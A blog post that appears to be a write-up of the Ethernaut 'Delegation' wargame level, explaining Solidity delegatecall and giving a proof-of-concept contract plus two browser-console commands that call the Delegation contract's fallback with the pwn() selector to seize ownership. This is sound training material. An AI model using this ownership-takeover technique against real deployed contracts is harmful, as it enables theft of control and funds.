<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.2.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css" integrity="sha256-xejo6yLi6vGtAjcMIsY8BHdKsLg7QynVlFMzdQgUuy8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"2997ms.github.io","root":"/","images":"/images","scheme":"Mist","darkmode":true,"version":"8.12.3","exturl":false,"sidebar":{"position":"left","Muse | Mist":320,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="It’s been half a year past since the last challenge. Let me start again and complete this series of challenges. The sixth level of Ethernaut is a very interesting challenge that mainly tests our under">
<meta property="og:type" content="article">
<meta property="og:title" content="Ethernaut Puzzle 06 Delegation">
<meta property="og:url" content="http://2997ms.github.io/2023/04/04/Ethernaut/Ethernaut-Puzzle-06-Delegation/index.html">
<meta property="og:site_name" content="2997ms">
<meta property="og:description" content="It’s been half a year past since the last challenge. Let me start again and complete this series of challenges. The sixth level of Ethernaut is a very interesting challenge that mainly tests our under">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2023-04-04T12:19:19.000Z">
<meta property="article:modified_time" content="2023-05-14T19:33:06.824Z">
<meta property="article:author" content="2997ms">
<meta property="article:tag" content="Ethernaut">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://2997ms.github.io/2023/04/04/Ethernaut/Ethernaut-Puzzle-06-Delegation/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://2997ms.github.io/2023/04/04/Ethernaut/Ethernaut-Puzzle-06-Delegation/","path":"2023/04/04/Ethernaut/Ethernaut-Puzzle-06-Delegation/","title":"Ethernaut Puzzle 06 Delegation"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Ethernaut Puzzle 06 Delegation | 2997ms</title>
  






  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">2997ms</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-user fa-fw"></i>Home</a></li><li class="menu-item menu-item-posts"><a href="/categories/BiWeeklyUpdate" rel="section"><i class="fa fa-th fa-fw"></i>posts</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">2997ms</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">165</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">67</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/2997ms" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;2997ms" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:wangchong756@gmail.com" title="E-Mail → mailto:wangchong756@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="http://2997ms.github.io/2023/04/04/Ethernaut/Ethernaut-Puzzle-06-Delegation/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="2997ms">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="2997ms">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Ethernaut Puzzle 06 Delegation | 2997ms">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Ethernaut Puzzle 06 Delegation
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2023-04-04 13:19:19" itemprop="dateCreated datePublished" datetime="2023-04-04T13:19:19+01:00">2023-04-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2023-05-14 20:33:06" itemprop="dateModified" datetime="2023-05-14T20:33:06+01:00">2023-05-14</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/BiWeeklyUpdate/" itemprop="url" rel="index"><span itemprop="name">BiWeeklyUpdate</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <p>It’s been half a year past since the last challenge. Let me start again and complete this series of challenges.</p>
<p>The sixth level of Ethernaut is a very interesting challenge that mainly tests our understanding of delegateCall.</p>
<span id="more"></span>



<p><code>delegatecall</code> is a low-level function in Solidity that is used to execute code from another contract in the context of the current contract. It is similar to <code>call</code>, but with an important difference: when you use <code>delegatecall</code>, the called contract’s code is executed with the current contract’s context, which means that any storage, balances, or other state variables will be those of the current contract.</p>
<p>Here’s an example of how <code>delegatecall</code> works:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract B &#123;</span><br><span class="line">    uint public x;</span><br><span class="line"></span><br><span class="line">    function setX(uint _x) public &#123;</span><br><span class="line">        x = _x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract A &#123;</span><br><span class="line">    uint public x;</span><br><span class="line">    B public b;</span><br><span class="line"></span><br><span class="line">    constructor(address _b) &#123;</span><br><span class="line">        b = B(_b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setX(uint _x) public &#123;</span><br><span class="line">        x = _x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setXFromB(uint _x) public &#123;</span><br><span class="line">        (bool success, ) = address(b).delegatecall(abi.encodeWithSignature(&quot;setX(uint256)&quot;, _x));</span><br><span class="line">        require(success, &quot;delegatecall failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>In this example, <code>A</code> has a reference to a <code>B</code> instance and a <code>setXFromB</code> function that uses <code>delegatecall</code> to call <code>B</code>‘s <code>setX</code> function with the same argument. When <code>setXFromB</code> is called, <code>B</code>‘s code is executed in the context of <code>A</code>, which means that the <code>x</code> variable in <code>A</code> will be set instead of the <code>x</code> variable in <code>B</code>.</p>
<p>It’s important to note that <code>delegatecall</code> is a powerful tool, but also a dangerous one. If you’re not careful, you can inadvertently change the state of your contract in unexpected ways. Always make sure you understand how it works before using it, and test your code thoroughly to ensure that it behaves as expected.</p>
<p>This challenge requires us to claim the ownership of the <code>Delegation</code> smart contract.</p>
<p>To claim the ownership, the method is straightforward, which is to find a way to call the <code>fallback</code> function of <code>Delegation</code>, and pass <code>pwn()</code> as <code>msg.data</code>. This will call the <code>pwn()</code> function inside the Delegate smart contract and assign the ownership.</p>
<p>At first, my idea was to write a smart contract to claim the ownership. My smart contract looked like this:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.1;</span><br><span class="line"></span><br><span class="line">interface Delegation &#123;</span><br><span class="line">&#125;</span><br><span class="line">contract POC &#123;</span><br><span class="line">    Delegation level6 = Delegation(0xeC926C37acc2E36240c484841A2a9847C708475d);</span><br><span class="line"></span><br><span class="line">    function run() external &#123;</span><br><span class="line"> </span><br><span class="line">       (bool success, ) = address(level6).call(abi.encodeWithSignature(&quot;pwn()&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>However, I realized later that this method would result in the ownership being assigned to the address of my smart contract instead of my address.</p>
<p>So, I needed to initiate the transaction myself and call the <code>fallback</code> function of the <code>Delegation</code> contract, passing <code>pwn()</code> as msg.data.</p>
<p>Run these two commands in the console of the browser:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var pwn_hacked = web3.utils.keccak256(&quot;pwn()&quot;)</span><br><span class="line">contract.sendTransaction(&#123;data: pwn_hacked&#125;)</span><br></pre></td></tr></table></figure>

<p>That’s done! Sumbit the instance!</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Ethernaut/" rel="tag"># Ethernaut</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2023/01/01/BB/2023/2023-1%E6%9C%88-%E6%88%91%E4%BB%AC%E7%9A%84%E5%91%BD%E8%BF%90%E5%88%BB%E5%9C%A8%E6%98%9F%E8%BE%B0%E4%B9%8B%E4%B8%8A/" rel="prev" title="2023年-1月-我们的命运刻在星辰之上">
                  <i class="fa fa-chevron-left"></i> 2023年-1月-我们的命运刻在星辰之上
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2023/04/30/BB/2024/2024-5%E6%9C%88-%E5%9C%A8%E5%B8%8C%E6%9C%9B%E7%9A%84%E7%94%B0%E9%87%8E%E4%B8%8A_%E5%89%AF%E6%9C%AC/" rel="next" title="2024-5月-在希望的田野上">
                  2024-5月-在希望的田野上 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">2997ms</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" rel="noopener" target="_blank">NexT.Mist</a>
  </div>

    </div>
  </footer>

  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  





  




  

  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>



</body>
</html>
